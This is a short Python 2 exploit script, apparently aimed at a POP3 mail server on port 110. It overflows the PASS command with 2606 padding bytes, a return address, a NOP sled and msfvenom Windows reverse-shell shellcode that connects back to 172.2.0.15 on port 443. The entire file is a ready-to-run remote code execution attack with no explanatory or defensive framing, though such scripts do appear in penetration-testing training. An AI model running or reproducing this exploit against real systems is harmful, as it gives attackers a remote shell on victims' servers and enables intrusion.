#!/usr/bin/env python
#
# msfvenom -p windows/shell_reverse_tcp LHOST=172.2.0.15 LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python
#
import socket
import sys

shellcode =  ""
shellcode += "\xbd\xe1\x2f\x1d\x01\xd9\xc3\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x52\x31\x6a\x12\x83\xc2\x04\x03\x8b\x21\xff"
shellcode += "\xf4\xb7\xd6\x7d\xf6\x47\x27\xe2\x7e\xa2\x16\x22\xe4"
shellcode += "\xa7\x09\x92\x6e\xe5\xa5\x59\x22\x1d\x3d\x2f\xeb\x12"
shellcode += "\xf6\x9a\xcd\x1d\x07\xb6\x2e\x3c\x8b\xc5\x62\x9e\xb2"
shellcode += "\x05\x77\xdf\xf3\x78\x7a\x8d\xac\xf7\x29\x21\xd8\x42"
shellcode += "\xf2\xca\x92\x43\x72\x2f\x62\x65\x53\xfe\xf8\x3c\x73"
shellcode += "\x01\x2c\x35\x3a\x19\x31\x70\xf4\x92\x81\x0e\x07\x72"
shellcode += "\xd8\xef\xa4\xbb\xd4\x1d\xb4\xfc\xd3\xfd\xc3\xf4\x27"
shellcode += "\x83\xd3\xc3\x5a\x5f\x51\xd7\xfd\x14\xc1\x33\xff\xf9"
shellcode += "\x94\xb0\xf3\xb6\xd3\x9e\x17\x48\x37\x95\x2c\xc1\xb6"
shellcode += "\x79\xa5\x91\x9c\x5d\xed\x42\xbc\xc4\x4b\x24\xc1\x16"
shellcode += "\x34\x99\x67\x5d\xd9\xce\x15\x3c\xb6\x23\x14\xbe\x46"
shellcode += "\x2c\x2f\xcd\x74\xf3\x9b\x59\x35\x7c\x02\x9e\x3a\x57"
shellcode += "\xf2\x30\xc5\x58\x03\x19\x02\x0c\x53\x31\xa3\x2d\x38"
shellcode += "\xc1\x4c\xf8\xef\x91\xe2\x53\x50\x41\x43\x04\x38\x8b"
shellcode += "\x4c\x7b\x58\xb4\x86\x14\xf3\x4f\x41\xb7\x10\x4f\x0c"
shellcode += "\xaf\x1a\x4f\x2f\x8b\x92\xa9\x45\xfb\xf2\x62\xf2\x62"
shellcode += "\x5f\xf8\x63\x6a\x75\x85\xa4\xe0\x7a\x7a\x6a\x01\xf6"
shellcode += "\x68\x1b\xe1\x4d\xd2\x8a\xfe\x7b\x7a\x50\x6c\xe0\x7a"
shellcode += "\x1f\x8d\xbf\x2d\x48\x63\xb6\xbb\x64\xda\x60\xd9\x74"
shellcode += "\xba\x4b\x59\xa3\x7f\x55\x60\x26\x3b\x71\x72\xfe\xc4"
shellcode += "\x3d\x26\xae\x92\xeb\x90\x08\x4d\x5a\x4a\xc3\x22\x34"
shellcode += "\x1a\x92\x08\x87\x5c\x9b\x44\x71\x80\x2a\x31\xc4\xbf"
shellcode += "\x83\xd5\xc0\xb8\xf9\x45\x2e\x13\xba\x66\xcd\xb1\xb7"
shellcode += "\x0e\x48\x50\x7a\x53\x6b\x8f\xb9\x6a\xe8\x25\x42\x89"
shellcode += "\xf0\x4c\x47\xd5\xb6\xbd\x35\x46\x53\xc1\xea\x67\x76"

bytes = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 39 + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],110))
    r = s.recv(1024)
    s.send("USER teste\r\n")
    r = s.recv(1024)
    s.send("PASS "+bytes+"\r\n")
except:
    print "Erro ao conectar"
